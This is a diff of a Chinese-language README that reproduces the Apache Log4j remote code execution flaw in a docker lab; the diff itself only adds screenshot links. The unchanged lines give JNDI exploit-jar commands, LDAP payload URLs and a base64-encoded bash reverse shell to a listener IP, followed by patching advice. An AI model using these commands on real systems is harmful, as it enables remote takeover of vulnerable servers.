@@ -31,7 +31,7 @@ JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar进行ldap协议监听，并提前输
 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "touch /tmp/88888888888" -A 192.168.32.1
 -C后面添加的是需要执行的命令
 -A后面是监听的IP地址
- 
+ ![image](https://github.com/rabbitsafe/Apache-Log4j_RCE/blob/main/2.png) 
 只要根据JDK的版本，提交不同的ldap
 如果JDK 是1.7，可以使用
 ldap://192.168.32.1:1389/sjrchi
@@ -40,23 +40,23 @@ ldap://192.168.32.1:1389/fojm7q
 
 通过BurpSuite提交数据包，由于url只接受需POST数据，受影响的参数是c，在验证的时候，一定要加入
 Content-Type: application/x-www-form-urlencoded;
- 
+![image](https://github.com/rabbitsafe/Apache-Log4j_RCE/blob/main/3.png)  
 已经接收到ldap协议数据
- 
+![image](https://github.com/rabbitsafe/Apache-Log4j_RCE/blob/main/4.png)  
 如果Apache Log4j远程代码执行漏洞成功，就会执行命令touch /tmp/88888888888，在tmp目录下建一个88888888888文件
 
 进入docker环境漏洞靶场，查看命令是否执行成功，文件成功被创建
 docker exec -it log4j_vuln_container /bin/bash
- 
+![image](https://github.com/rabbitsafe/Apache-Log4j_RCE/blob/main/5.png)  
 
 通过修改-C里面的命令内容，获取shell
 对bash -i >& /dev/tcp/192.168.32.1/22 0>&1命令进行加密处理
- 
+![image](https://github.com/rabbitsafe/Apache-Log4j_RCE/blob/main/6.png)  
 java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjMyLjEvMjIgMD4mMQ==}|{base64,-d}|{bash,-i}" -A 192.168.32.1
- 
- 
+![image](https://github.com/rabbitsafe/Apache-Log4j_RCE/blob/main/7.png)  
+![image](https://github.com/rabbitsafe/Apache-Log4j_RCE/blob/main/8.png)  
 成功获取shell
- 
+![image](https://github.com/rabbitsafe/Apache-Log4j_RCE/blob/main/9.png)  
 
 0x5：漏洞修复建议
 1、升级Apache Log4j2组件到最新版本（log4j-2.15.0-rc2）：
